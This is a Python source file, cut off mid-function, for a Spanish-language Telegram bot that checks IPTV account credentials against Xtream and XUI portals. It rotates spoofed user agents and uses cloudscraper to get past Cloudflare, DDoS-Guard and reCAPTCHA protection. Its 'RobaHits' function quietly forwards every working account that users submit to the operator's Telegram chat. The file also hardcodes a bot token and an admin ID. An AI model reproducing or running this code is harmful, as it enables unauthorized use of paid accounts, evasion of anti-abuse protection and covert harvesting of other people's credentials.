#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║     🦂 𝐈𝐏𝐓𝐕 𝐁𝐎𝐓 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐎 — 𝐁𝐘 𝐋𝐔𝐈𝐒 𝐑 🦂     ║
║                    𝐕𝐄𝐑𝐒𝐈Ó𝐍 𝟒.𝟎 — 𝟐𝟒/𝟕                    ║
╠══════════════════════════════════════════════════════════════════╣
║  ✨ Características:                                              ║
║  • Verificación ultra-rápida (paralela + TCP 3s)                 ║
║  • Soporte XUI One + Xtream Codes + MAC Portal                   ║
║  • Bypass Cloudflare/DDoS-Guard/reCAPTCHA con cloudscraper       ║
║  • Streaming de listas 50MB+ sin timeout                         ║
║  • Loop de reconexión robusto 24/7                               ║
║  • RobaHits automático (solo listas ACTIVAS)                     ║
║  • Diseño PRO con emojis y bordes elegantes                      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os, re, json, time, threading, logging, socket, asyncio, random, pickle, traceback
from pathlib import Path
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime
import pytz
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode
import cloudscraper

requests.packages.urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════
#  ⚙️  CONFIGURACIÓN — Variables de entorno / Directas
# ═══════════════════════════════════════════════════════════════════

BOT_TOKEN       = "8708803857:AAHsIF_AbBuM_GPam1MWYBBRFycRSWAA4Cs"
ADMIN_ID        = 1183299436
ROBAHITS_CHATID = "1183299436"  # Recibirás los hits aquí
TZ_NAME         = "America/Chicago"
BOT_USERNAME    = "@Luishits_bot"

TZ = pytz.timezone(TZ_NAME)

# ── Configuración de logging elegante ────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="\033[36m%(asctime)s\033[0m [\033[32m%(levelname)s\033[0m] \033[33m%(name)s\033[0m - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger(__name__)

# ── Estado global ────────────────────────────────────────────────────────────
bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}

# ── Decoraciones visuales ────────────────────────────────────────────────────
LINE  = "━" * 42
LINE2 = "┉" * 42

# ═══════════════════════════════════════════════════════════════════
#  🎨 BANDERAS Y EMOJIS MEJORADOS
# ═══════════════════════════════════════════════════════════════════

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
}

# ═══════════════════════════════════════════════════════════════════
#  ⏱️ TIMEOPT — Rápido pero preciso
# ═══════════════════════════════════════════════════════════════════

TCP_TIMEOUT   = 3    # test de conectividad TCP
CONN_TIMEOUT  = 6    # conexión HTTP
READ_TIMEOUT  = 12   # lectura HTTP
TOTAL_TIMEOUT = 25   # timeout global por verificación

# ═══════════════════════════════════════════════════════════════════
#  📡 USER-AGENTS IPTV REALES
# ═══════════════════════════════════════════════════════════════════

ALL_USER_AGENTS = [
    "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
    "TiviMate/4.4.0 (Android 11)",
    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
    "VLC/3.0.21 LibVLC/3.0.21",
    "VLC/3.0.18 LibVLC/3.0.18",
    "okhttp/4.9.0",
    "GSE SMART IPTV/7.4 (Android 11)",
    "MXPlayer/1.73.6 (Linux; Android 12) ExoPlayerLib/2.18.1",
    "Dalvik/2.1.0 (Linux; Android 10; Generic Android TV)",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
    "SS_IPTV/3.9.0 (SmartTV)",
    "curl/7.88.1",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 GSE/8.2 IPTV",
    "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/5.0 TV Safari/538.1",
]

# ═══════════════════════════════════════════════════════════════════
#  🛡️ DOMINIOS CON CLOUDFLARE / DDoS-GUARD
# ═══════════════════════════════════════════════════════════════════

CF_DOMAINS = [
    'star-flix.net','mylatinotvmoon.com','venuspv.me','mytitantv.com',
    'mymoontools.xyz','moonstalker.xyz','moontools.me','moonxtream.com',
    'titanxtv.com','venusiptv.com','latinchannel.tv','etvhosts.site',
]

# ═══════════════════════════════════════════════════════════════════
#  🔌 PUERTOS POR PROTOCOLO
# ═══════════════════════════════════════════════════════════════════

HTTPS_PORTS = {"443","8443","2053","2083","2087","2096","8888"}
HTTP_PORTS  = {"80","8080","8000","8008","25461","2082","2086","55337"}

# ═══════════════════════════════════════════════════════════════════
#  📝 RESPUESTAS DE ERROR EN TEXTO PLANO
# ═══════════════════════════════════════════════════════════════════

PLAIN_ERRORS = {
    "PLAYLIST_DISABLED": "Lista deshabilitada",
    "ACCOUNT_EXPIRED":   "Cuenta expirada",
    "ACCOUNT_BANNED":    "Cuenta bloqueada",
    "USER_NOT_FOUND":    "Usuario no encontrado",
    "INVALID_PASS":      "Contraseña incorrecta",
    "ACCOUNT_DISABLED":  "Cuenta deshabilitada",
    "TRIAL_EXPIRED":     "Trial expirado",
}

# ── Directorio para cookies CF ───────────────────────────────────────────────
COOKIES_DIR = Path("cf_cookies")
COOKIES_DIR.mkdir(exist_ok=True)

# ── Pool de threads ──────────────────────────────────────────────────────────
_EXECUTOR = ThreadPoolExecutor(max_workers=20)

# ═══════════════════════════════════════════════════════════════════
#  🕐 UTILIDADES
# ═══════════════════════════════════════════════════════════════════

def now_str() -> str:
    """Fecha y hora actual formateada."""
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch) -> str:
    """Convierte timestamp a fecha legible."""
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "📅 Sin fecha"

def flag_from_code(code: str) -> str:
    """Genera emoji de bandera desde código ISO."""
    f = FLAGS.get(code, "")
    if not f and len(code) == 2:
        pts = [ord(c) + 127397 for c in code.upper()]
        f = chr(pts[0]) + chr(pts[1])
    return f

# ═══════════════════════════════════════════════════════════════════
#  🔍 EXTRACCIÓN DE URL — Universal
# ═══════════════════════════════════════════════════════════════════

def extract_from_url(text: str):
    """
    Extrae (portal, user, pwd, is_xui) de cualquier formato:
    - Xtream: get.php / player_api.php con username= & password=
    - XUI One: /playlist/{user}/{pass}/...
    - MAC Portal: /c/ o /stalker_portal/
    - pipe separado: portal|user|pass
    - espacio separado: portal user pass
    """
    text = text.strip().replace("\r","").replace("%3A",":")

    # ── XUI One / MAC playlist ────────────────────────────────────────────────
    m = re.search(
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?&]+)',
        text, re.IGNORECASE)
    if m:
        portal = m.group(1)
        user   = m.group(2)
        pwd    = m.group(3).split('?')[0].split('&')[0].strip()
        return portal, user, pwd, True

    # ── Xtream estándar ───────────────────────────────────────────────────────
    patterns = [
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/c/[^/\s]*/([^/\s\n]+)/([^/\s\n?]+)',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            portal = m.group(1)
            user   = m.group(2)
            pwd    = m.group(3)
            for bad in ("&type=","&output=","&format=","\n"," "):
                pwd = pwd.split(bad)[0]
            pwd = pwd.split('&')[0].split('?')[0].strip()
            return portal, user, pwd, False

    # ── pipe o espacio ────────────────────────────────────────────────────────
    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2], False

    parts = text.split()
    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
        return parts[0], parts[1], parts[2], False

    return None, None, None, False

def _port_to_scheme(port_str: str, default: str = "http") -> str:
    """Detecta el protocolo correcto SOLO por el número de puerto."""
    if port_str in HTTPS_PORTS:
        return "https"
    if port_str in HTTP_PORTS:
        return "http"
    return default

def _schemes_for_portal(portal: str):
    """Retorna (scheme_preferido, scheme_fallback) según el puerto del portal."""
    port_str = portal.split(":")[1] if ":" in portal else "8080"
    primary = _port_to_scheme(port_str)
    alt     = "https" if primary == "http" else "http"
    return primary, alt

def _is_cf(host: str) -> bool:
    h = host.lower().split(':')[0]
    return any(d in h for d in CF_DOMAINS)

# ═══════════════════════════════════════════════════════════════════
#  🍪 COOKIES CLOUDFLARE
# ═══════════════════════════════════════════════════════════════════

def _cookie_path(host: str) -> Path:
    return COOKIES_DIR / f"{host.split(':')[0].replace('.','_')}.pkl"

def _save_cookies(session, host: str):
    try:
        with open(_cookie_path(host), 'wb') as f:
            pickle.dump(dict(session.cookies), f)
    except Exception:
        pass

def _load_cookies(session, host: str):
    try:
        p = _cookie_path(host)
        if p.exists() and (time.time() - p.stat().st_mtime) < 3600:
            with open(p, 'rb') as f:
                session.cookies.update(pickle.load(f))
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════
#  📡 SESIÓN HTTP RÁPIDA
# ═══════════════════════════════════════════════════════════════════

_UA_CYCLE = 0
_UA_LOCK  = threading.Lock()

def _next_ua() -> str:
    global _UA_CYCLE
    with _UA_LOCK:
        ua = ALL_USER_AGENTS[_UA_CYCLE % len(ALL_USER_AGENTS)]
        _UA_CYCLE += 1
        return ua

def _quick_session(host: str = "") -> requests.Session:
    """Sesión HTTP ligera y rápida sin retries."""
    s = requests.Session()
    s.mount("http://",  HTTPAdapter(max_retries=0))
    s.mount("https://", HTTPAdapter(max_retries=0))
    if host:
        _load_cookies(s, host)
    s.headers.update({
        "User-Agent":      _next_ua(),
        "Accept":          "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "close",
        "Cache-Control":   "no-cache",
    })
    return s

# ═══════════════════════════════════════════════════════════════════
#  🛡️ CLOUDFLARE BYPASS
# ═══════════════════════════════════════════════════════════════════

def _cf_get(url: str, host: str, timeout: int = 15):
    """Bypass CF/DDoS-Guard/reCAPTCHA con cloudscraper."""
    try:
        scraper = cloudscraper.create_scraper(
            browser={"browser":"chrome","platform":"windows","mobile":False},
            delay=3
        )
        _load_cookies(scraper, host)
        r = scraper.get(url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code == 200:
            raw = r.text.strip()
            if not (raw.startswith("<") and ("cloudflare" in raw.lower() or "just a moment" in raw.lower())):
                _save_cookies(scraper, host)
                return r
    except Exception as e:
        log.debug(f"cloudscraper err: {e}")

    # Fallback
    for ua in random.sample(ALL_USER_AGENTS, min(4, len(ALL_USER_AGENTS))):
        try:
            s = _quick_session(host)
            s.headers["User-Agent"] = ua
            s.headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "es-US,es;q=0.9,en;q=0.8",
            })
            r = s.get(url, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200:
                raw = r.text.strip()
                if not (raw.startswith("<") and ("cloudflare" in raw.lower() or "just a moment" in raw.lower())):
                    _save_cookies(s, host)
                    return r
        except Exception:
            pass
    return None

# ═══════════════════════════════════════════════════════════════════
#  🔬 ANÁLISIS DE RESPUESTA
# ═══════════════════════════════════════════════════════════════════

def _parse_json(raw: str):
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    for ch in ('{', '['):
        idx = raw.find(ch)
        if idx >= 0:
            try:
                return json.loads(raw[idx:])
            except Exception:
                pass
    return None

def _analyze_json(data) -> tuple:
    if not isinstance(data, dict):
        return "RETRY", None
    ui = data.get("user_info") or (data if "auth" in data else None)
    if ui is None:
        return "RETRY", None
    try:
        auth = int(ui.get("auth", -1))
    except Exception:
        return "RETRY", None
    if auth == 0:
        return "FAIL", None
    if auth == 1:
        real_ui = data.get("user_info", ui)
        payload = {"user_info": real_ui, "server_info": data.get("server_info", {})}
        status = str(real_ui.get("status", "")).strip().lower()
        return ("HIT" if status == "active" else "CUSTOM"), payload
    return "RETRY", None

def _process(r) -> tuple:
    if r is None:
        return "RETRY", None
    code = r.status_code

    if code == 404:
        return "FAIL", None
    if code in (401, 403, 500, 502, 503, 504):
        return "RETRY", None
    if code not in (200, 206):
        return "RETRY", None

    try:
        raw = r.text.strip()
    except Exception:
        return "RETRY", None

    if not raw or len(raw) < 4:
        return "RETRY", None

    # HTML = CF
    if raw[0] == "<":
        low = raw.lower()
        if any(k in low for k in ("cloudflare","just a moment","recaptcha","ddos")):
            return "RETRY", None
        return "RETRY", None

    # Errores en texto plano
    upper = raw.upper()
    for key, msg in PLAIN_ERRORS.items():
        if key in upper:
            return "FAIL", None

    # M3U directo
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth":1, "status":"Active", "exp_date":"0",
                "active_cons":"?", "max_connections":"?",
                "is_trial":"0", "created_at":"0",
            },
            "server_info": {}, "m3u_direct": True,
        }

    data = _parse_json(raw)
    if data is None:
        return "RETRY", None
    return _analyze_json(data)

def _check_url(url: str, host: str) -> tuple:
    try:
        s = _quick_session(host)
        r = s.get(url, timeout=(CONN_TIMEOUT, READ_TIMEOUT),
                  verify=False, allow_redirects=True)
        _save_cookies(s, host)
        return _process(r)
    except Exception:
        return "RETRY", None

# ═══════════════════════════════════════════════════════════════════
#  🚀 VERIFICACIÓN COMPLETA — Paralela y rápida
# ═══════════════════════════════════════════════════════════════════

def verify_account(portal: str, user: str, pwd: str, is_xui: bool = False) -> tuple:
    """Verifica cuenta con timeout total de TOTAL_TIMEOUT segundos."""
    host    = portal.split(':')[0]
    port    = int(portal.split(':')[1]) if ':' in portal else 8080
    is_cf   = _is_cf(host)
    t_start = time.time()

    def elapsed():
        return time.time() - t_start

    def timed_out():
        return elapsed() >= TOTAL_TIMEOUT

    # Paso 1: TCP rápido
    tcp_ok = False
    for p in (port, 80, 443):
        if timed_out():
            break
        try:
            conn = socket.create_connection((host, p), timeout=TCP_TIMEOUT)
            conn.close()
            tcp_ok = True
            break
        except Exception:
            pass

    if not tcp_ok:
        log.warning(f"TCP ❌ {host} → RETRY")
        return "RETRY", None

    # Paso 2: Peticiones paralelas
    primary, alt = _schemes_for_portal(portal)

    urls = []
    for scheme in (primary, alt):
        base = f"{scheme}://{portal}"
        urls.append(f"{base}/player_api.php?username={user}&password={pwd}")
        urls.append(f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus")
        if is_xui:
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u")

    # También probar playlist siempre
    for scheme in (primary, alt):
        base = f"{scheme}://{portal}"
        urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
        urls.append(f"{base}/get.php?username={user}&password={pwd}")

    seen = set()
    unique_urls = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            unique_urls.append(u)

    remaining = TOTAL_TIMEOUT - elapsed()
    if remaining <= 0:
        return "RETRY", None

    futures = {_EXECUTOR.submit(_check_url, url, host): url for url in unique_urls}

    try:
        for fut in as_completed(futures, timeout=remaining):
            try:
                result, payload = fut.result()
                if result in ("HIT", "FAIL", "CUSTOM"):
                    for f in futures:
                        f.cancel()
                    log.info(f"✅ {result} en {elapsed():.1f}s")
                    return result, payload
            except Exception:
                pass
    except Exception:
        pass

    # Paso 3: Bypass CF
    if is_cf and not timed_out():
        log.info(f"🛡️ CF bypass para {host}")
        for scheme in (primary, alt):
            if timed_out():
                break
            for endpoint in (
                f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}",
                f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
            ):
                if timed_out():
                    break
                r = _cf_get(endpoint, host, timeout=10)
                res, pay = _process(r)
                if res != "RETRY":
                    log.info(f"✅ CF bypass {res}")
                    return res, pay

    # Paso 4: Fallback final
    if not timed_out():
        for scheme in (primary, alt):
            if timed_out():
                break
            url = f"{scheme}://{portal}/get.php?username={user}&password={pwd}"
            res, pay = _check_url(url, host)
            if res != "RETRY":
                return res, pay

    return "RETRY", None

# ═══════════════════════════════════════════════════════════════════
#  📊 CONTEO DE CONTENIDO
# ═══════════════════════════════════════════════════════════════════

def _count_json_objects(url: str, timeout_s: int = 10) -> str:
    try:
        s = _quick_session()
        resp = s.get(url, timeout=(CONN_TIMEOUT, timeout_s),
                     verify=False, stream=True)
        if resp.status_code != 200:
            resp.close()
            return "0"
        depth = count = 0
        in_str = esc = started = False
        max_bytes = 20 * 1024 * 1024
        read = 0
        for chunk in resp.iter_content(chunk_size=65536):
            if not chunk:
                continue
            read += len(chunk)
            try:
                text = chunk.decode("utf-8", errors="ignore")
            except:
                continue
            for ch in text:
                if esc:
                    esc = False
                    continue
                if ch == "\\" and in_str:
                    esc = True
                    continue
                if ch == '"':
                    in_str = not in_str
                    continue
                if in_str:
                    continue
                if ch == '[' and not started and depth == 0:
                    started = True
                    continue
                if not started:
                    continue
                if ch == '{':
                    depth += 1
                    if depth == 1:
                        count += 1
                elif ch == '}':
                    depth -= 1
                elif ch == ']' and depth == 0:
                    resp.close()
                    return str(count) if count else "0"
            if read >= max_bytes:
                resp.close()
                return str(count) if count else "0"
        resp.close()
        return str(count) if count else "0"
    except Exception:
        return "0"

def _count_list(url: str, timeout_s: int = 8) -> str:
    try:
        s = _quick_session()
        r = s.get(url, timeout=(CONN_TIMEOUT, timeout_s), verify=False)
        if r.status_code == 200:
            d = r.json()
            if isinstance(d, list):
                return str(len(d))
    except Exception:
        pass
    return "0"

def get_content_counts(portal: str, user: str, pwd: str) -> tuple:
    """Obtiene Live/VOD/Series en paralelo."""
    base = f"http://{portal}"
    urls = {
        "live": f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
        "vod":  f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_streams",
        "ser":  f"{base}/player_api.php?username={user}&password={pwd}&action=get_series",
        "vc":   f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_categories",
        "sc":   f"{base}/player_api.php?username={user}&password={pwd}&action=get_series_categories",
    }

    results = {}
    futs = {
        _EXECUTOR.submit(_count_json_objects, urls["live"], 12): "live",
        _EXECUTOR.submit(_count_json_objects, urls["vod"],  12): "vod",
        _EXECUTOR.submit(_count_json_objects, urls["ser"],  12): "ser",
    }

    deadline = time.time() + 18
    for fut in as_completed(futs, timeout=max(0, deadline - time.time())):
        try:
            results[futs[fut]] = fut.result() or "0"
        except Exception:
            pass

    if not results.get("vod"):
        try:
            vc = _count_list(urls["vc"], 6)
            results["vod"] = vc if vc != "0" else results.get("vod", "0")
        except Exception:
            pass
    if not results.get("ser"):
        try:
            sc = _count_list(urls["sc"], 6)
            results["ser"] = sc if sc != "0" else results.get("ser", "0")
        except Exception:
            pass

    return results.get("live", "0"), results.get("vod", "0"), results.get("ser", "0")

def get_categories(portal: str, user: str, pwd: str, limit: int = 20) -> str:
    """Obtiene categorías live con conteo."""
    try:
        base = f"http://{portal}"
        r = requests.get(
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent": _next_ua()}, timeout=(CONN_TIMEOUT, 10), verify=False)
        if r.status_code != 200:
            return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats:
            return ""

        lines = []
        for c in cats[:limit]:
            name = c.get("category_name", "").replace("\\/", "/").strip()
            if name:
                lines.append(f"  ⭐ {name}")
        if len(cats) > limit:
            lines.append(f"  ➕ ...y {len(cats)-limit} categorías más")
        return "\n".join(lines) if lines else ""
    except Exception:
        return ""

def get_location(portal: str) -> str:
    try:
        ip = portal.split(":")[0]
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=4, verify=False)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                code = d.get("countryCode", "")
                return f"{d.get('country', '?')} {flag_from_code(code)}"
    except Exception:
        pass
    return "🌍 Desconocido"

# ═══════════════════════════════════════════════════════════════════
#  🔔 ROBAHITS — SOLO LISTAS ACTIVAS
# ═══════════════════════════════════════════════════════════════════

def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
    """Envía SOLO cuentas ACTIVAS al admin."""
    if not BOT_TOKEN or not ROBAHITS_CHATID:
        return
    try:
        expire = ts_to_date(ui.get("exp_date", 0))
        created = ts_to_date(ui.get("created_at", 0))
        m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        
        text = (
            f"╔══════════════════════════════════════════════════════╗\n"
            f"║     🎯 𝐇𝐈𝐓 𝐂𝐀𝐏𝐓𝐔𝐑𝐀𝐃𝐎 — 𝐂𝐔𝐄𝐍𝐓𝐀 𝐀𝐂𝐓𝐈𝐕𝐀 🎯     ║\n"
            f"╠══════════════════════════════════════════════════════╣\n"
            f"║ 👤 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐨𝐫: @{from_user}\n"
            f"║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>\n"
            f"║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{user}</code>\n"
            f"║ 🔑 𝐏𝐚𝐬𝐬: <code>{pwd}</code>\n"
            f"║ 📅 𝐂𝐫𝐞𝐚𝐝𝐚: {created}\n"
            f"║ ⏲ 𝐕𝐞𝐧𝐜𝐞: {expire}\n"
            f"║ 📺 𝐄𝐧 𝐕𝐢𝐯𝐨: {live}  |  🎬 𝐕𝐎𝐃: {vod}  |  📺 𝐒𝐞𝐫𝐢𝐞𝐬: {series}\n"
            f"╠══════════════════════════════════════════════════════╣\n"
            f"║ 🔗 <a href='{m3u}'>📺 𝐌𝟑𝐔 𝐋𝐢𝐧𝐤</a>\n"
            f"╠══════════════════════════════════════════════════════╣\n"
            f"║ 🕐 {now_str()}\n"
            f"║ 🦂 {BOT_USERNAME}\n"
            f"╚══════════════════════════════════════════════════════╝"
        )
        
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ROBAHITS_CHATID, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
        log.info(f"📤 RobaHit enviado: {portal} | {user}")
    except Exception as e:
        log.warning(f"RobaHit err: {e}")

# ═══════════════════════════════════════════════════════════════════
#  🃏 TARJETAS DE RESULTADO — ESTILO PRO
# ═══════════════════════════════════════════════════════════════════

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
    expire = ts_to_date(ui.get("exp_date", 0))
    created = ts_to_date(ui.get("created_at", 0))
    active = ui.get("active_cons", "?")
    maxcon = ui.get("max_connections", "?")
    status = ui.get("status", "Active")
    trial = "No Trial" if str(ui.get("is_trial", "0")) in ("0", "false", "") else "✅ Trial"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"
    
    t = (
        f"╔══════════════════════════════════════════════════════════════════╗\n"
        f"║                      🦂 𝐋𝐔𝐈𝐒 𝐑 🦂                      ║\n"
        f"║                    ★彡 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐅𝐎 彡★                    ║\n"
        f"╠══════════════════════════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐄𝐬𝐭𝐚𝐝𝐨: 🟢 𝐀𝐂𝐓𝐈𝐕𝐀                                      ║\n"
        f"║ 🧪 𝐓𝐫𝐢𝐚𝐥: {trial}                                             ║\n"
        f"║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>                                      ║\n"
        f"║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{user}</code>                                       ║\n"
        f"║ 🔑 𝐂𝐨𝐧𝐭𝐫𝐚𝐬𝐞ñ𝐚: <code>{pwd}</code>                                   ║\n"
        f"║ 📅 𝐂𝐫𝐞𝐚𝐝𝐚: {created}                                          ║\n"
        f"║ ⏲ 𝐕𝐞𝐧𝐜𝐞: {expire}                                             ║\n"
        f"║ 👥 𝐂𝐨𝐧𝐞𝐱𝐢𝐨𝐧𝐞𝐬: {active} / {maxcon}                                    ║\n"
        f"║ 📍 𝐔𝐛𝐢𝐜𝐚𝐜𝐢ó𝐧: {location}                                          ║\n"
        f"╠══════════════════════════════════════════════════════════════════╣\n"
        f"║                    ★彡 𝐂𝐎𝐍𝐓𝐄𝐍𝐈𝐃𝐎 彡★                     ║\n"
        f"╠══════════════════════════════════════════════════════════════════╣\n"
        f"║ 📺 𝐄𝐧 𝐕𝐢𝐯𝐨: {live}  |  🎬 𝐕𝐎𝐃: {vod}  |  📺 𝐒𝐞𝐫𝐢𝐞𝐬: {series}  ║\n"
        f"╠══════════════════════════════════════════════════════════════════╣\n"
        f"║ 🔗 <a href='{m3u}'>📺 𝐌𝟑𝐔 𝐋𝐢𝐧𝐤</a>  |  <a href='{epg}'>📅 𝐄𝐏𝐆 𝐋𝐢𝐧𝐤</a> ║\n"
    )
    
    if cats:
        t += f"╠══════════════════════════════════════════════════════════════════╣\n"
        t += f"║                    ★彡 𝐂𝐀𝐓𝐄𝐆𝐎𝐑Í𝐀𝐒 彡★                    ║\n"
        t += f"╠══════════════════════════════════════════════════════════════════╣\n"
        for line in cats.split('\n')[:12]:
            t += f"║ {line:<66} ║\n"
    
    t += (
        f"╠══════════════════════════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{tg_user}                                  ║\n"
        f"║ 🕐 {now_str():<66} ║\n"
        f"║ 🦂 {BOT_USERNAME:<66} ║\n"
        f"╚══════════════════════════════════════════════════════════════════╝"
    )
    return t

def card_custom(portal, user, pwd, ui, tg_user) -> str:
    t = (
        f"╔══════════════════════════════════════════════════════╗\n"
        f"║         🦂 𝐋𝐔𝐈𝐒 𝐑 — 𝐂𝐔𝐄𝐍𝐓𝐀 𝐍𝐎 𝐀𝐂𝐓𝐈𝐕𝐀 🦂         ║\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ 🟡 𝐄𝐬𝐭𝐚𝐝𝐨: ⚠️ {ui.get('status', '?').upper()}\n"
        f"║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>\n"
        f"║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{user}</code>\n"
        f"║ 🔑 𝐂𝐨𝐧𝐭𝐫𝐚𝐬𝐞ñ𝐚: <code>{pwd}</code>\n"
        f"║ ⏲ 𝐕𝐞𝐧𝐜𝐞: {ts_to_date(ui.get('exp_date', 0))}\n"
        f"║ 👥 𝐌𝐚𝐱: {ui.get('max_connections', '?')}\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{tg_user}\n"
        f"║ 🕐 {now_str()}\n"
        f"║ 🦂 {BOT_USERNAME}\n"
        f"╚══════════════════════════════════════════════════════╝"
    )
    return t

def card_fail(portal, user, tg_user) -> str:
    t = (
        f"╔══════════════════════════════════════════════════════╗\n"
        f"║           🦂 𝐋𝐔𝐈𝐒 𝐑 — 𝐂𝐔𝐄𝐍𝐓𝐀 𝐈𝐍𝐕Á𝐋𝐈𝐃𝐀 🦂           ║\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ 🔴 𝐂𝐮𝐞𝐧𝐭𝐚 𝐢𝐧𝐯á𝐥𝐢𝐝𝐚 𝐨 𝐧𝐨 𝐞𝐧𝐜𝐨𝐧𝐭𝐫𝐚𝐝𝐚\n"
